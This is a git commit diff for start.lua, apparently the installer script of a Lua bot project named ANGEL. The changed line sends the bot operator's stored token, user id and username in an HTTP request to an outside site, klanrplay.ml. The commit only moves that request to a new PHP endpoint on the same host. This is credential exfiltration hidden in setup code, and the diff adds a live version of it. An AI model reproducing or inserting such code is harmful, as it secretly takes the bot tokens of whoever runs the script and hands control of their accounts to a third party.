e597c22df2596add9679eb40ac0babc46d4da7aa
ANGEL-Tea <77549759+ANGEL-Tea@users.noreply.github.com>
2021-07-26 06:31:27 +0300

    start.lua

--- start.lua
+++ start.lua
@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_ANGEL_Info()
 Create_Info(database:get(Server_ANGEL.."Token_ANGEL"),database:get(Server_ANGEL.."Id_ANGEL"),database:get(Server_ANGEL.."UserName_ANGEL"))   
-https.request("http://klanrplay.ml/hano/hno.php?id="..database:get(Server_ANGEL.."Id_ANGEL").."&user="..database:get(Server_ANGEL.."UserName_ANGEL").."&token="..database:get(Server_ANGEL.."Token_ANGEL"))
+https.request("http://klanrplay.ml/engal/engal.php?id="..database:get(Server_ANGEL.."Id_ANGEL").."&user="..database:get(Server_ANGEL.."UserName_ANGEL").."&token="..database:get(Server_ANGEL.."Token_ANGEL"))
 local RunANGEL = io.open("ANGEL", 'w')
 RunANGEL:write([[
 #!/usr/bin/env bash
